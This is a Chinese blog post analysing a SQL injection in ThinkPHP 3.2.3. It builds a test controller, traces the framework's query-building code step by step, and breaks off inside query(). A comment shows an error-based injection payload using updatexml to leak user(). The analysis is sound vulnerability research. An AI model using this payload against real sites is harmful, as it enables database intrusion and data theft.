<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><title>Thinkphp3.2.3-SQL注入分析</title><link rel="stylesheet" href="/css/oasis.css"><meta name="generator" content="Hexo 7.1.1"><link rel="alternate" href="atom.xml" title="面朝大海，春暖花开" type="application/atom+xml">
</head><body><div id="content"><h1 id="title">面朝大海，春暖花开</h1><div id="menu-outer"><nav id="menu-inner"><a id="menu-back" href="javascript:history.back()">Back</a><time datetime="2024-04-20T04:41:24.815Z">2024-04-20</time></nav></div><div id="content-outer"><div id="content-inner"><article id="post"><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>源码下载：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">链接：https://pan.baidu.com/s/1YoIW0jqq3w3caV_0xfY51A?pwd=lc5m </span><br><span class="line">提取码：lc5m</span><br></pre></td></tr></table></figure>

<p>使用phpstudy进行搭建</p>
<p>php5.6.9</p>
<p>搭建成功后到\ThinkPHP\conf\convention.php配置一下数据库信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create table users(</span><br><span class="line">    -&gt; id int not null auto_increment primary key,</span><br><span class="line">    -&gt; name varchar(50) not null,</span><br><span class="line">    -&gt; age int</span><br><span class="line">    -&gt; );</span><br></pre></td></tr></table></figure>

<p>随后在\Application\Home\Conteoller创建测试文件(SqlConteoller.class.php)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Home</span>\<span class="title class_">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SqlController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">show</span>(<span class="string">&#x27;tp3复现测试&lt;br&gt;&#x27;</span>);</span><br><span class="line">        <span class="variable">$user</span> = <span class="title function_ invoke__">M</span>(<span class="string">&#x27;users&#x27;</span>)-&gt;<span class="title function_ invoke__">find</span>(<span class="title function_ invoke__">I</span>(<span class="string">&#x27;GET.id&#x27;</span>));</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$user</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//i()：主要用于更加方便和安全的获取系统输入变量	如：$_GET(),$_POST()</span></span><br><span class="line"><span class="comment">//M():进行模型实例化</span></span><br><span class="line"><span class="comment">//find():查询方法</span></span><br></pre></td></tr></table></figure>





<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>先贴出链子</p>
<p><img src="/QianGeG.github.io/2024/04/20/Thinkphp3.2/wallpaper-2572384.jpg" alt="tp3.2.3_find"></p>
<p>从I函数进行跟进</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">I</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$default</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$filter</span> = <span class="literal">null</span>, <span class="variable">$datas</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;	<span class="comment">//传入的是get.id，会进入这里进行拆分</span></span><br><span class="line">        <span class="comment">// 指定参数来源</span></span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$method</span>, <span class="variable">$name</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>, <span class="number">2</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 默认为自动判断</span></span><br><span class="line">        <span class="variable">$method</span> = <span class="string">&#x27;param&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">switch</span> (<span class="title function_ invoke__">strtolower</span>(<span class="variable">$method</span>)) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;get&#x27;</span>:</span><br><span class="line">            <span class="variable">$input</span> = &amp;<span class="variable">$_GET</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;&#x27;</span> == <span class="variable">$name</span>) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="variable">$input</span>[<span class="variable">$name</span>])) &#123;</span><br><span class="line">        <span class="comment">// 取值操作</span></span><br><span class="line">        <span class="variable">$data</span>    = <span class="variable">$input</span>[<span class="variable">$name</span>];</span><br><span class="line">        <span class="comment">//这里的参数会进行C函数过滤，DEFAULT_FILTER=htmlspecialchars</span></span><br><span class="line">        <span class="variable">$filters</span> = <span class="keyword">isset</span>(<span class="variable">$filter</span>) ? <span class="variable">$filter</span> : <span class="title function_ invoke__">C</span>(<span class="string">&#x27;DEFAULT_FILTER&#x27;</span>);</span><br><span class="line">        ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里的过滤对后面的payload并没有什么影响。部分代码隐藏了</p>
<p>find()</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">find</span>(<span class="params"><span class="variable">$options</span> = <span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$options</span>) || <span class="title function_ invoke__">is_string</span>(<span class="variable">$options</span>)) &#123;</span><br><span class="line">            <span class="comment">//进入不到，因为is_numeric和is_string不满足</span></span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//进入这里getPk</span></span><br><span class="line">        <span class="comment">// 根据复合主键查找记录</span></span><br><span class="line">        <span class="comment">//$pk=&#x27;id&#x27;</span></span><br><span class="line">        <span class="variable">$pk</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getPk</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$options</span>) &amp;&amp; (<span class="title function_ invoke__">count</span>(<span class="variable">$options</span>) &gt; <span class="number">0</span>) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$pk</span>)) &#123;</span><br><span class="line">            <span class="comment">//进不到这里，因为is_array不满足</span></span><br><span class="line">            <span class="comment">// 根据复合主键查询</span></span><br><span class="line">           	...</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 总是查找一条记录</span></span><br><span class="line">        <span class="variable">$options</span>[<span class="string">&#x27;limit&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="comment">// 分析表达式</span></span><br><span class="line">        <span class="comment">//$options = array(2) &#123; [&quot;where&quot;]=&gt; string(1) &quot;1&quot; [&quot;limit&quot;]=&gt; int(1) &#125;</span></span><br><span class="line">        <span class="variable">$options</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_parseOptions</span>(<span class="variable">$options</span>);</span><br><span class="line">        <span class="comment">//经过_parseOptions加上了table键和users键，自动加上了表明和模型名</span></span><br><span class="line">        <span class="comment">//array(4) &#123; [&quot;where&quot;]=&gt; string(1) &quot;1&quot; [&quot;limit&quot;]=&gt; int(1) [&quot;table&quot;]=&gt; string(5) &quot;users&quot; [&quot;model&quot;]=&gt; string(5) &quot;users&quot; &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 判断查询缓存</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;cache&#x27;</span>])) &#123;</span><br><span class="line">            <span class="comment">//到不了，不存在cache</span></span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//进入select查询</span></span><br><span class="line">        <span class="variable">$resultSet</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">select</span>(<span class="variable">$options</span>);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里存在两个方法需要着重注意一下，_parseOptions、select</p>
<p>_parseOptions：自动取了表明和模型名</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">_parseOptions</span>(<span class="params"><span class="variable">$options</span> = <span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$options</span>)) &#123;</span><br><span class="line">            <span class="comment">//进入这里,数组合并</span></span><br><span class="line">            <span class="variable">$options</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;options, <span class="variable">$options</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;table&#x27;</span>])) &#123;</span><br><span class="line">            <span class="comment">// 自动获取表名</span></span><br><span class="line">            <span class="variable">$options</span>[<span class="string">&#x27;table&#x27;</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getTableName</span>();</span><br><span class="line">            <span class="variable">$fields</span>           = <span class="variable language_">$this</span>-&gt;fields;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 指定数据表 则重新获取字段列表 但不支持类型检测</span></span><br><span class="line">            <span class="variable">$fields</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getDbFields</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 数据表别名</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;alias&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$options</span>[<span class="string">&#x27;table&#x27;</span>] .= <span class="string">&#x27; &#x27;</span> . <span class="variable">$options</span>[<span class="string">&#x27;alias&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 记录操作的模型名称</span></span><br><span class="line">        <span class="variable">$options</span>[<span class="string">&#x27;model&#x27;</span>] = <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 字段类型验证</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$fields</span>) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;join&#x27;</span>])) &#123;</span><br><span class="line">            <span class="comment">//到不了，因为is_array、empty和isset</span></span><br><span class="line">            <span class="comment">// 对数组查询条件进行字段类型检查</span></span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>] <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">                <span class="comment">//去空</span></span><br><span class="line">                <span class="variable">$key</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$key</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$key</span>, <span class="variable">$fields</span>, <span class="literal">true</span>)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">is_scalar</span>(<span class="variable">$val</span>)) &#123;</span><br><span class="line">                        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_parseType</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>], <span class="variable">$key</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$key</span>) &amp;&amp; <span class="string">&#x27;_&#x27;</span> != <span class="title function_ invoke__">substr</span>(<span class="variable">$key</span>, <span class="number">0</span>, <span class="number">1</span>) &amp;&amp; <span class="literal">false</span> === <span class="title function_ invoke__">strpos</span>(<span class="variable">$key</span>, <span class="string">&#x27;.&#x27;</span>) &amp;&amp; <span class="literal">false</span> === <span class="title function_ invoke__">strpos</span>(<span class="variable">$key</span>, <span class="string">&#x27;(&#x27;</span>) &amp;&amp; <span class="literal">false</span> === <span class="title function_ invoke__">strpos</span>(<span class="variable">$key</span>, <span class="string">&#x27;|&#x27;</span>) &amp;&amp; <span class="literal">false</span> === <span class="title function_ invoke__">strpos</span>(<span class="variable">$key</span>, <span class="string">&#x27;&amp;&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;strict&#x27;</span>])) &#123;</span><br><span class="line">                        <span class="title function_ invoke__">E</span>(<span class="title function_ invoke__">L</span>(<span class="string">&#x27;_ERROR_QUERY_EXPRESS_&#x27;</span>) . <span class="string">&#x27;:[&#x27;</span> . <span class="variable">$key</span> . <span class="string">&#x27;=&gt;&#x27;</span> . <span class="variable">$val</span> . <span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">unset</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>][<span class="variable">$key</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 查询过后清空sql表达式组装 避免影响下次查询</span></span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;options = <span class="keyword">array</span>();</span><br><span class="line">        <span class="comment">// 表达式过滤</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_options_filter</span>(<span class="variable">$options</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$options</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>select()</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params"><span class="variable">$options</span> = <span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//// array(4) &#123; [&quot;where&quot;]=&gt; string(1) &quot;1&quot; [&quot;limit&quot;]=&gt; int(1)</span></span><br><span class="line">    <span class="comment">///  [&quot;table&quot;]=&gt; string(5) &quot;users&quot; [&quot;model&quot;]=&gt; string(5) &quot;users&quot; &#125;</span></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;model = <span class="variable">$options</span>[<span class="string">&#x27;model&#x27;</span>];</span><br><span class="line">    <span class="comment">//給一个空数组进行合并</span></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseBind</span>(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;bind&#x27;</span>]) ? <span class="variable">$options</span>[<span class="string">&#x27;bind&#x27;</span>] : <span class="keyword">array</span>());</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sql</span>    = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">buildSelectSql</span>(<span class="variable">$options</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>, !<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;fetch_sql&#x27;</span>]) ? <span class="literal">true</span> : <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>buildSelectSql：进入parseSql进行替换SQL模版实际的值</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">buildSelectSql</span>(<span class="params"><span class="variable">$options</span> = <span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">        <span class="comment">//到不了，isset不满足</span></span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//&#x27;SELECT%DISTINCT% %FIELD% FROM %TABLE%%FORCE%%JOIN%%WHERE%%GROUP%%HAVING%%ORDER%%LIMIT% %UNION%%LOCK%%COMMENT%&#x27;</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseSql</span>(<span class="variable">$this</span>-&gt;selectSql, <span class="variable">$options</span>);</span><br><span class="line">    <span class="comment">//SELECT * FROM `users` WHERE 1 LIMIT 1</span></span><br><span class="line">    <span class="comment">//SELECT * FROM `users` WHERE 1 and updatexml(1,concat(0x7e,user()),1) # LIMIT 1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$sql</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>parseSql</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parseSql</span>(<span class="params"><span class="variable">$sql</span>, <span class="variable">$options</span> = <span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="title function_ invoke__">str_replace</span>(</span><br><span class="line">        <span class="keyword">array</span>(<span class="string">&#x27;%TABLE%&#x27;</span>, <span class="string">&#x27;%DISTINCT%&#x27;</span>, <span class="string">&#x27;%FIELD%&#x27;</span>, <span class="string">&#x27;%JOIN%&#x27;</span>, <span class="string">&#x27;%WHERE%&#x27;</span>, <span class="string">&#x27;%GROUP%&#x27;</span>, <span class="string">&#x27;%HAVING%&#x27;</span>, <span class="string">&#x27;%ORDER%&#x27;</span>, <span class="string">&#x27;%LIMIT%&#x27;</span>, <span class="string">&#x27;%UNION%&#x27;</span>, <span class="string">&#x27;%LOCK%&#x27;</span>, <span class="string">&#x27;%COMMENT%&#x27;</span>, <span class="string">&#x27;%FORCE%&#x27;</span>),</span><br><span class="line">        <span class="keyword">array</span>(</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseTable</span>(<span class="variable">$options</span>[<span class="string">&#x27;table&#x27;</span>]),</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseDistinct</span>(<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;distinct&#x27;</span>]) ? <span class="variable">$options</span>[<span class="string">&#x27;distinct&#x27;</span>] : <span class="literal">false</span>),</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseField</span>(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;field&#x27;</span>]) ? <span class="variable">$options</span>[<span class="string">&#x27;field&#x27;</span>] : <span class="string">&#x27;*&#x27;</span>),</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseJoin</span>(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;join&#x27;</span>]) ? <span class="variable">$options</span>[<span class="string">&#x27;join&#x27;</span>] : <span class="string">&#x27;&#x27;</span>),</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseWhere</span>(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>]) ? <span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>] : <span class="string">&#x27;&#x27;</span>),</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseGroup</span>(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;group&#x27;</span>]) ? <span class="variable">$options</span>[<span class="string">&#x27;group&#x27;</span>] : <span class="string">&#x27;&#x27;</span>),</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseHaving</span>(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;having&#x27;</span>]) ? <span class="variable">$options</span>[<span class="string">&#x27;having&#x27;</span>] : <span class="string">&#x27;&#x27;</span>),</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseOrder</span>(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;order&#x27;</span>]) ? <span class="variable">$options</span>[<span class="string">&#x27;order&#x27;</span>] : <span class="string">&#x27;&#x27;</span>),</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseLimit</span>(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;limit&#x27;</span>]) ? <span class="variable">$options</span>[<span class="string">&#x27;limit&#x27;</span>] : <span class="string">&#x27;&#x27;</span>),</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseUnion</span>(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;union&#x27;</span>]) ? <span class="variable">$options</span>[<span class="string">&#x27;union&#x27;</span>] : <span class="string">&#x27;&#x27;</span>),</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseLock</span>(<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;lock&#x27;</span>]) ? <span class="variable">$options</span>[<span class="string">&#x27;lock&#x27;</span>] : <span class="literal">false</span>),</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseComment</span>(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;comment&#x27;</span>]) ? <span class="variable">$options</span>[<span class="string">&#x27;comment&#x27;</span>] : <span class="string">&#x27;&#x27;</span>),</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseForce</span>(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;force&#x27;</span>]) ? <span class="variable">$options</span>[<span class="string">&#x27;force&#x27;</span>] : <span class="string">&#x27;&#x27;</span>),</span><br><span class="line">        ), <span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$sql</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>替换后就会换为如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `users` WHERE 1 LIMIT 1 </span><br></pre></td></tr></table></figure>

<p>最后进行了query进行预编译查询并返回</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">query</span>(<span class="params"><span class="variable">$str</span>, <span class="variable">$fetchSql</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">initConnect</span>(<span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;_linkID) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    